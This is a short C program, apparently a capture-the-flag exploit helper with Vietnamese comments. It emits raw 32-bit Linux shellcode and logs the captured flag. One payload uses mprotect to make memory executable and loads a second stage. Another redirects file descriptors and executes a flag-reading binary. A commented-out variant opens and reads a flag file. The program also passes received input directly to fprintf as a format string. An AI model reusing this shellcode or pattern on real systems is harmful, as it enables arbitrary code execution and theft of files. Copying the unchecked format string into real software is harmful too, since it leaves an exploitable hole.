// day la dich vu dung de cung cap shellcode 2 va` 3, dong thoi nhan lai. flag va luu vao file

#include <stdio.h>

main(){
	// make bss executable, read into bss
	char shellcode_mpr[0x22+1] = "\xB0\x7D\xBB\x00\x90\x0E\x08\xB9\x00\x10\x00\x00\x6A\x07\x5A\xCD\x80\x6A\x03\x58\x31\xDB\xB9\x00\x90\x0E\x08\x6A\x4e\x5A\xCD\x80\xFF\xD1\x0a";
	write(1, &shellcode_mpr, 0x23);

	// open read write
	//char shellcode_orw[98] = "\xB8\x05\x00\x00\x00\x6A\x00\x68\x41\x47\x00\x00\x68\x67\x2F\x46\x4C\x68\x64\x64\x69\x6E\x68\x65\x2F\x6B\x69\x68\x2F\x68\x6F\x6D\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x04\x00\x00\xCD\x80\xBE\x00\x00\x00\x00\x89\xC3\xB9\xFF\x9F\x0E\x08\x46\x41\xB8\x03\x00\x00\x00\xBA\x01\x00\x00\x00\xCD\x80\x83\xF8\x00\x75\xED\x31\xDB\xB8\x04\x00\x00\x00\xB9\x00\xA0\x0E\x08\x89\xF2\xCD\x80\x0a";
	char shellcode_orw[0x4e] = "\xB8\x3F\x00\x00\x00\xBB\x00\x00\x00\x00\xB9\x01\x00\x00\x00\xCD\x80\xB8\x3F\x00\x00\x00\xBB\x00\x00\x00\x00\xB9\x02\x00\x00\x00\xCD\x80\x6A\x00\x68\x66\x6C\x61\x67\x68\x67\x65\x74\x5F\x68\x6C\x61\x67\x2F\x68\x6D\x65\x2F\x66\x68\x2E\x2F\x68\x6F\x89\xE3\x6A\x00\x53\x89\xE1\xB8\x0B\x00\x00\x00\x31\xD2\xCD\x80\x0a";
	write(1, &shellcode_orw, 0x4e);
	
	write(1, "./I_am_fl4g\x0a", 12);

	// save flag
	char flag[0x100];
	read(0, &flag, 0x100);
	FILE *f = fopen("result.txt", "a+");
	fprintf(f, &flag);
	close(f);
}
